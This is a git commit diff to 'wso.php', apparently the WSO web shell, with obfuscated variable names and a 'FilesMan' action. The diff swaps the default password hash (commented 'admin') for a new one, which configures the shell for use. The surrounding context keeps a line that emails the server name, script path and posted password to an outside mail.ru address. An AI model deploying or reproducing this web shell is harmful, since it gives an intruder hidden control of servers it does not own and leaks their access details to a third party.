fac83a0fe7d793fcfa696f5229572c96aaf061ac
senada13 <senadelana@gmail.com>
2024-08-28 21:08:45 +0700

    j7Xazuma

--- wso.php
+++ wso.php
@@ -4,7 +4,7 @@ if(array_key_exists('watching',$_POST)){
 	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('hard_linux@mail.ru', 'root', $tmp); // Edit or delete!
 }
 //-----------------Password---------------------
-$▛ = "21232f297a57a5a743894a0e4a801fc3"; //admin
+$▛ = "ab245f84a4f5a9bc1ad43484d5bb95fb";
 $▘ = true;
 $▜ = 'UTF-8';
 $▚ = 'FilesMan';
